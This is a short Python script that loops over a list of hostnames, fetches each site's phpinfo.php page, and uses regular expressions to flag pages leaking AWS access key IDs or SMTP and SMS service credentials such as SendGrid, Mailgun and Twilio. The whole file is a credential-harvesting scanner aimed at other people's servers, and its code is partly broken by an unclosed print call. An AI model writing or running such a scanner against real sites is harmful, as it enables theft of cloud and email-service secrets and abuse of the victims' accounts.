import os
import requests
import re
import threading
from colorama import init, Fore
init()

def scan(i):
	try:
		v = requests.get(f"http://" + i + "/phpinfo.php", headers={'User-Agent': 'Mozilla/5.0'})
		if re.findall(r"AKIA[A-Z0-9]{16}", v.text):
			print(f"{Fore.GREEN}AKIA: " + v.url)

		if re.findall(r"smtp\.sendgrid\.net|smtp\.mailgun\.org|smtp-relay\.sendinblue\.com|smtp.tipimail.com|smtp.sparkpostmail.com|vonage|nexmo|twilo|smtp.deliverabilitymanager.net|smtp.mailendo.com|mail.smtpeter.com|mail.smtp2go.com|smtp.socketlabs.com|secure.emailsrvr.com|mail.infomaniak.com|smtp.pepipost.com|smtp.elasticemail.com|smtp25.elasticemail.com|pro.turbo-smtp.com|smtp-pulse.com|in-v3.mailjet.com", v.text):
			print(f"{Fore.GREEN}OTHER: " + v.url)
	except:
		pass

def main():
	directory = r'C:\Users\seepy\Desktop\hits-10-11-2021'
	sites = []
	for filename in os.listdir(directory):
		sites.append(filename.split(".txt")[0])
	
	force = 10000
	
	for i in sites:
		scan(i)

def clean():
	with open("ndd.txt", "r", encoding="utf8") as file:
		v = []
		for i in file.readlines():
			v.append(i.strip().split("://")[1].split("/")[0])

		with open("output.txt", "a+") as file2:
			for i in v:
				file2.write(i + "\n")
		print(v

main()
